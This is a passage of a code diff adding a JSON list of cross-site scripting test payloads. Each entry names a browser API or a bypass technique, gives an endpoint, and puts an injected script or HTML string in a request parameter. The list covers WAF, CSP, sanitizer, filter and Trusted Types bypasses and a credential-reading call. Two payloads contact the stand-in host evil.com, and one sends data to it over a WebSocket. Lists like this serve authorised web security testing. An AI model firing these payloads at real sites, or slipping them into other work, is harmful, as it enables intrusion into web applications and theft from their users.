+      "speak": "<script>new SpeechSynthesisUtterance('XSS')</script>"
+    }
+  },
+  {
+    "name": "XSS with Web Bluetooth API",
+    "description": "XSS usando Web Bluetooth API",
+    "method": "GET",
+    "endpoint": "/bluetooth",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "device": "<script>navigator.bluetooth.requestDevice({acceptAllDevices:true})</script>"
+    }
+  },
+  {
+    "name": "XSS using Web USB API",
+    "description": "XSS con Web USB API",
+    "method": "GET",
+    "endpoint": "/usb",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "device": "<script>navigator.usb.requestDevice({filters:[]})</script>"
+    }
+  },
+  {
+    "name": "XSS with Web NFC API",
+    "description": "XSS usando Web NFC API",
+    "method": "GET",
+    "endpoint": "/nfc",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "tag": "<script>navigator.nfc && navigator.nfc.watch(function(){alert('XSS')})</script>"
+    }
+  },
+  {
+    "name": "XSS using Web MIDI API",
+    "description": "XSS con Web MIDI API",
+    "method": "GET",
+    "endpoint": "/midi",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "device": "<script>navigator.requestMIDIAccess().then(function(){alert('XSS')})</script>"
+    }
+  },
+  {
+    "name": "XSS with Web Share API",
+    "description": "XSS usando Web Share API",
+    "method": "GET",
+    "endpoint": "/share",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "data": "<script>navigator.share({title:'XSS'})</script>"
+    }
+  },
+  {
+    "name": "XSS using Web Locks API",
+    "description": "XSS con Web Locks API",
+    "method": "GET",
+    "endpoint": "/lock",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "lock": "<script>navigator.locks.request('xss',function(){alert('XSS')})</script>"
+    }
+  },
+  {
+    "name": "XSS with Web HID API",
+    "description": "XSS usando Web HID API",
+    "method": "GET",
+    "endpoint": "/hid",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "device": "<script>navigator.hid.requestDevice({filters:[]})</script>"
+    }
+  },
+  {
+    "name": "XSS using Web Serial API",
+    "description": "XSS con Web Serial API",
+    "method": "GET",
+    "endpoint": "/serial",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "port": "<script>navigator.serial.requestPort()</script>"
+    }
+  },
+  {
+    "name": "XSS with Web Authentication API",
+    "description": "XSS usando Web Authentication API",
+    "method": "GET",
+    "endpoint": "/webauthn",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "auth": "<script>navigator.credentials.create({publicKey:{}})</script>"
+    }
+  },
+  {
+    "name": "XSS using Web Crypto API",
+    "description": "XSS con Web Crypto API",
+    "method": "GET",
+    "endpoint": "/crypto",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "encrypt": "<script>crypto.subtle.generateKey({name:'AES-GCM',length:256},true,['encrypt','decrypt'])</script>"
+    }
+  },
+  {
+    "name": "XSS with Web Assembly",
+    "description": "XSS usando Web Assembly",
+    "method": "GET",
+    "endpoint": "/wasm",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "module": "<script>WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0]))</script>"
+    }
+  },
+  {
+    "name": "XSS using Service Workers",
+    "description": "XSS con Service Workers",
+    "method": "GET",
+    "endpoint": "/serviceworker",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "worker": "<script>navigator.serviceWorker.register('data:text/javascript,alert(\\'XSS\\')')</script>"
+    }
+  },
+  {
+    "name": "XSS with Shared Workers",
+    "description": "XSS usando Shared Workers",
+    "method": "GET",
+    "endpoint": "/sharedworker",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "worker": "<script>new SharedWorker('data:text/javascript,alert(\\'XSS\\')')</script>"
+    }
+  },
+  {
+    "name": "XSS using Web Workers",
+    "description": "XSS con Web Workers",
+    "method": "GET",
+    "endpoint": "/webworker",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "worker": "<script>new Worker('data:text/javascript,alert(\\'XSS\\')')</script>"
+    }
+  },
+  {
+    "name": "XSS with IndexedDB Injection",
+    "description": "XSS inyectando en IndexedDB",
+    "method": "GET",
+    "endpoint": "/indexeddb",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "data": "<script>indexedDB.open('test').onsuccess=function(){alert('XSS')}</script>"
+    }
+  },
+  {
+    "name": "XSS using localStorage Injection",
+    "description": "XSS inyectando en localStorage",
+    "method": "GET",
+    "endpoint": "/localstorage",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "key": "<script>localStorage.setItem('xss','<img src=x onerror=alert(\\'XSS\\')>')</script>"
+    }
+  },
+  {
+    "name": "XSS with sessionStorage Injection",
+    "description": "XSS inyectando en sessionStorage",
+    "method": "GET",
+    "endpoint": "/sessionstorage",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "key": "<script>sessionStorage.setItem('xss','<img src=x onerror=alert(\\'XSS\\')>')</script>"
+    }
+  },
+  {
+    "name": "XSS using Cookie Injection",
+    "description": "XSS inyectando en cookies",
+    "method": "GET",
+    "endpoint": "/cookie",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "name": "<script>document.cookie='xss=<img src=x onerror=alert(\\'XSS\\')>;path=/'</script>"
+    }
+  },
+  {
+    "name": "XSS with DOM Clobbering",
+    "description": "XSS usando DOM Clobbering",
+    "method": "GET",
+    "endpoint": "/dom",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "id": "<form id=alert><input name=toString value=1></form>"
+    }
+  },
+  {
+    "name": "XSS using Mutation Events",
+    "description": "XSS con Mutation Events",
+    "method": "GET",
+    "endpoint": "/mutation",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "element": "<div onDOMNodeInserted=\"alert('XSS')\"></div>"
+    }
+  },
+  {
+    "name": "XSS with Mutation Observers",
+    "description": "XSS usando Mutation Observers",
+    "method": "GET",
+    "endpoint": "/mutationobserver",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "observer": "<script>new MutationObserver(function(){alert('XSS')}).observe(document,{childList:true})</script>"
+    }
+  },
+  {
+    "name": "XSS using Intersection Observers",
+    "description": "XSS con Intersection Observers",
+    "method": "GET",
+    "endpoint": "/intersection",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "observer": "<script>new IntersectionObserver(function(){alert('XSS')}).observe(document.body)</script>"
+    }
+  },
+  {
+    "name": "XSS with Resize Observers",
+    "description": "XSS usando Resize Observers",
+    "method": "GET",
+    "endpoint": "/resizeobserver",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "observer": "<script>new ResizeObserver(function(){alert('XSS')}).observe(document.body)</script>"
+    }
+  },
+  {
+    "name": "XSS using Performance Observers",
+    "description": "XSS con Performance Observers",
+    "method": "GET",
+    "endpoint": "/performance",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "observer": "<script>new PerformanceObserver(function(){alert('XSS')}).observe({entryTypes:['resource']})</script>"
+    }
+  },
+  {
+    "name": "XSS with Reporting Observers",
+    "description": "XSS usando Reporting Observers",
+    "method": "GET",
+    "endpoint": "/reporting",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "observer": "<script>new ReportingObserver(function(){alert('XSS')},{types:['intervention']}).observe()</script>"
+    }
+  },
+  {
+    "name": "XSS using Custom Elements",
+    "description": "XSS con Custom Elements",
+    "method": "GET",
+    "endpoint": "/customelement",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "element": "<script>customElements.define('xss-element', class extends HTMLElement {connectedCallback(){alert('XSS')}})</script>"
+    }
+  },
+  {
+    "name": "XSS with Shadow DOM",
+    "description": "XSS usando Shadow DOM",
+    "method": "GET",
+    "endpoint": "/shadowdom",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "shadow": "<script>document.body.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(\\'XSS\\')>'</script>"
+    }
+  },
+  {
+    "name": "XSS using Template Instantiation",
+    "description": "XSS con Template Instantiation",
+    "method": "GET",
+    "endpoint": "/templateinst",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "template": "<template shadowrootmode=open><script>alert('XSS')</script></template>"
+    }
+  },
+  {
+    "name": "XSS with Declarative Shadow DOM",
+    "description": "XSS usando Declarative Shadow DOM",
+    "method": "GET",
+    "endpoint": "/declarativeshadow",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "shadow": "<div><template shadowrootmode=open><script>alert('XSS')</script></template></div>"
+    }
+  },
+  {
+    "name": "XSS using Document Fragments",
+    "description": "XSS con Document Fragments",
+    "method": "GET",
+    "endpoint": "/fragment",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "fragment": "<script>document.createDocumentFragment().appendChild(document.createElement('script')).textContent=\"alert('XSS')\"</script>"
+    }
+  },
+  {
+    "name": "XSS with Range API",
+    "description": "XSS usando Range API",
+    "method": "GET",
+    "endpoint": "/range",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "range": "<script>document.createRange().createContextualFragment('<script>alert(\\'XSS\\')<\\/script>')</script>"
+    }
+  },
+  {
+    "name": "XSS using Selection API",
+    "description": "XSS con Selection API",
+    "method": "GET",
+    "endpoint": "/selection",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "select": "<script>window.getSelection().toString=function(){alert('XSS')}</script>"
+    }
+  },
+  {
+    "name": "XSS with History API",
+    "description": "XSS usando History API",
+    "method": "GET",
+    "endpoint": "/history",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "state": "<script>history.pushState({},'','javascript:alert(\\'XSS\\')')</script>"
+    }
+  },
+  {
+    "name": "XSS using Navigation API",
+    "description": "XSS con Navigation API",
+    "method": "GET",
+    "endpoint": "/navigation",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "navigate": "<script>navigation.navigate('javascript:alert(\\'XSS\\')')</script>"
+    }
+  },
+  {
+    "name": "XSS with Broadcast Channel API",
+    "description": "XSS usando Broadcast Channel API",
+    "method": "GET",
+    "endpoint": "/broadcast",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "channel": "<script>new BroadcastChannel('xss').postMessage('XSS')</script>"
+    }
+  },
+  {
+    "name": "XSS using Channel Messaging API",
+    "description": "XSS con Channel Messaging API",
+    "method": "GET",
+    "endpoint": "/channel",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "message": "<script>new MessageChannel().port1.postMessage('XSS')</script>"
+    }
+  },
+  {
+    "name": "XSS with Web Sockets",
+    "description": "XSS usando Web Sockets",
+    "method": "GET",
+    "endpoint": "/websocket",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "socket": "<script>new WebSocket('ws://evil.com').send('XSS')</script>"
+    }
+  },
+  {
+    "name": "XSS using Server-Sent Events",
+    "description": "XSS con Server-Sent Events",
+    "method": "GET",
+    "endpoint": "/sse",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "event": "<script>new EventSource('data:text/event-stream,data: XSS\\n\\n').onmessage=function(){alert('XSS')}</script>"
+    }
+  },
+  {
+    "name": "XSS with Web Transport",
+    "description": "XSS usando Web Transport",
+    "method": "GET",
+    "endpoint": "/webtransport",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "transport": "<script>new WebTransport('https://evil.com')</script>"
+    }
+  },
+  {
+    "name": "XSS using WebCodecs API",
+    "description": "XSS con WebCodecs API",
+    "method": "GET",
+    "endpoint": "/webcodecs",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "codec": "<script>new VideoEncoder({output:function(){alert('XSS')},error:function(){}})</script>"
+    }
+  },
+  {
+    "name": "XSS with WebGPU API",
+    "description": "XSS usando WebGPU API",
+    "method": "GET",
+    "endpoint": "/webgpu",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "gpu": "<script>navigator.gpu.requestAdapter()</script>"
+    }
+  },
+  {
+    "name": "XSS using WebNN API",
+    "description": "XSS con WebNN API",
+    "method": "GET",
+    "endpoint": "/webnn",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "nn": "<script>navigator.ml.createContext()</script>"
+    }
+  },
+  {
+    "name": "XSS with WebXR API",
+    "description": "XSS usando WebXR API",
+    "method": "GET",
+    "endpoint": "/webxr",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "xr": "<script>navigator.xr.requestSession('immersive-vr')</script>"
+    }
+  },
+  {
+    "name": "XSS using Payment Request API",
+    "description": "XSS con Payment Request API",
+    "method": "GET",
+    "endpoint": "/payment",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "payment": "<script>new PaymentRequest([{supportedMethods:'basic-card'}],{total:{label:'Total',amount:{currency:'USD',value:'0.01'}}})</script>"
+    }
+  },
+  {
+    "name": "XSS with Credential Management API",
+    "description": "XSS usando Credential Management API",
+    "method": "GET",
+    "endpoint": "/credentials",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "credential": "<script>navigator.credentials.get({password:true})</script>"
+    }
+  },
+  {
+    "name": "XSS using Presentation API",
+    "description": "XSS con Presentation API",
+    "method": "GET",
+    "endpoint": "/presentation",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "present": "<script>navigator.presentation.requestStart({url:'javascript:alert(\\'XSS\\')'})</script>"
+    }
+  },
+  {
+    "name": "XSS with Remote Playback API",
+    "description": "XSS usando Remote Playback API",
+    "method": "GET",
+    "endpoint": "/remoteplayback",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "remote": "<script>document.createElement('video').remote.prompt()</script>"
+    }
+  },
+  {
+    "name": "XSS using Screen Wake Lock API",
+    "description": "XSS con Screen Wake Lock API",
+    "method": "GET",
+    "endpoint": "/wakeLock",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "wake": "<script>navigator.wakeLock.request('screen')</script>"
+    }
+  },
+  {
+    "name": "XSS with Sensor APIs",
+    "description": "XSS usando Sensor APIs",
+    "method": "GET",
+    "endpoint": "/sensor",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "sensor": "<script>new Accelerometer({frequency:60}).start()</script>"
+    }
+  },
+  {
+    "name": "XSS using Contact Picker API",
+    "description": "XSS con Contact Picker API",
+    "method": "GET",
+    "endpoint": "/contacts",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "contact": "<script>navigator.contacts.select(['name'],{multiple:true})</script>"
+    }
+  },
+  {
+    "name": "XSS with File System Access API",
+    "description": "XSS usando File System Access API",
+    "method": "GET",
+    "endpoint": "/filesystem",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "file": "<script>window.showOpenFilePicker()</script>"
+    }
+  },
+  {
+    "name": "XSS using Badging API",
+    "description": "XSS con Badging API",
+    "method": "GET",
+    "endpoint": "/badging",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "badge": "<script>navigator.setAppBadge(1)</script>"
+    }
+  },
+  {
+    "name": "XSS with Content Indexing API",
+    "description": "XSS usando Content Indexing API",
+    "method": "GET",
+    "endpoint": "/contentindex",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "index": "<script>navigator.serviceWorker.ready.then(function(reg){reg.active.postMessage('XSS')})</script>"
+    }
+  },
+  {
+    "name": "XSS using Background Fetch API",
+    "description": "XSS con Background Fetch API",
+    "method": "GET",
+    "endpoint": "/backgroundfetch",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "fetch": "<script>navigator.serviceWorker.ready.then(function(reg){reg.backgroundFetch.fetch('xss',['/'])}</script>"
+    }
+  },
+  {
+    "name": "XSS with Background Sync API",
+    "description": "XSS usando Background Sync API",
+    "method": "GET",
+    "endpoint": "/backgroundsync",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "sync": "<script>navigator.serviceWorker.ready.then(function(reg){reg.sync.register('xss')})</script>"
+    }
+  },
+  {
+    "name": "XSS using Periodic Background Sync API",
+    "description": "XSS con Periodic Background Sync API",
+    "method": "GET",
+    "endpoint": "/periodicsync",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "periodic": "<script>navigator.serviceWorker.ready.then(function(reg){reg.periodicSync.register('xss',{minInterval:86400000})})</script>"
+    }
+  },
+  {
+    "name": "XSS with Web Share Target API",
+    "description": "XSS usando Web Share Target API",
+    "method": "GET",
+    "endpoint": "/sharetarget",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "share": "<script>navigator.serviceWorker.ready.then(function(reg){reg.active.postMessage({action:'xss'})})</script>"
+    }
+  },
+  {
+    "name": "XSS using Web App Manifest",
+    "description": "XSS con Web App Manifest",
+    "method": "GET",
+    "endpoint": "/manifest",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "manifest": "<link rel=\"manifest\" href=\"data:application/json,{'name':'XSS'}\">"
+    }
+  },
+  {
+    "name": "XSS with Trusted Types Bypass",
+    "description": "XSS bypassing Trusted Types",
+    "method": "GET",
+    "endpoint": "/trustedtypes",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "payload": "<script>trustedTypes.createPolicy('default',{createHTML:function(s){return s}})</script>"
+    }
+  },
+  {
+    "name": "XSS using CSP Bypass",
+    "description": "XSS bypassing Content Security Policy",
+    "method": "GET",
+    "endpoint": "/csp",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "bypass": "<script src=\"data:text/javascript,alert('XSS')\"></script>"
+    }
+  },
+  {
+    "name": "XSS with XSS Auditor Bypass",
+    "description": "XSS bypassing XSS Auditor",
+    "method": "GET",
+    "endpoint": "/xssauditor",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "bypass": "<script>/*<script>*/\nalert('XSS')</script>"
+    }
+  },
+  {
+    "name": "XSS using WAF Bypass",
+    "description": "XSS bypassing Web Application Firewall",
+    "method": "GET",
+    "endpoint": "/waf",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "bypass": "<script>alert(String.fromCharCode(88,83,83))</script>"
+    }
+  },
+  {
+    "name": "XSS with Filter Bypass",
+    "description": "XSS bypassing input filters",
+    "method": "GET",
+    "endpoint": "/filter",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "bypass": "<scr<script>ipt>alert('XSS')</scr</script>ipt>"
+    }
+  },
+  {
+    "name": "XSS using Encoding Bypass",
+    "description": "XSS bypassing encoding",
+    "method": "GET",
+    "endpoint": "/encoding",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "bypass": "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
+    }
+  },
+  {
+    "name": "XSS with Sanitizer Bypass",
+    "description": "XSS bypassing HTML sanitizers",
+    "method": "GET",
+    "endpoint": "/sanitizer",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "bypass": "<img src=\"x\" onerror=\"alert('XSS')\">"
+    }
+  },
+  {
+    "name": "XSS using Library Bypass",
+    "description": "XSS bypassing client-side libraries",
+    "method": "GET",
+    "endpoint": "/library",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "bypass": "<script>$.parseHTML('<img src=x onerror=alert(\\'XSS\\')>')</script>"
+    }
+  },
+  {
+    "name": "XSS with Framework Bypass",
+    "description": "XSS bypassing JavaScript frameworks",
+    "method": "GET",
+    "endpoint": "/framework",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "bypass": "{{ constructor.constructor('alert(\\'XSS\\')')() }}"
+    }
+  },
+  {
+    "name": "XSS using Template Injection",
+    "description": "XSS via template injection",
+    "method": "GET",
+    "endpoint": "/template",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "name": "<%= 7 * 7 %>"
+    }
   }
+]
